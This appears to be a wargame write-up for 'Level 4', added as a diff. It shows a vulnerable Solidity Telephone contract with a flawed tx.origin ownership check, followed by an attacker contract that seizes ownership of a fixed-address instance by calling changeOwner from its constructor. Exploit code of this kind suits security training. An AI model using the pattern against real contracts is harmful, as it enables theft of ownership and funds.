@@ -1,0 +1,29 @@
+# Level 4
+
+Reading the contract shows that if another contract's owner calls the changeOwner function, it would own the contract
+So, using remix ide, I created an ownTelephone contract and with a contractor, owned the contract upon deploying the contract 
+
+
+pragma solidity ^0.4.18;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract ownTelephone {
+    Telephone tel = Telephone(0x40a00A01b2e47caa6d5D613C0f589AaEd1D5F9CC);
+    constructor () public {
+        tel.changeOwner(msg.sender);
+    }
+}
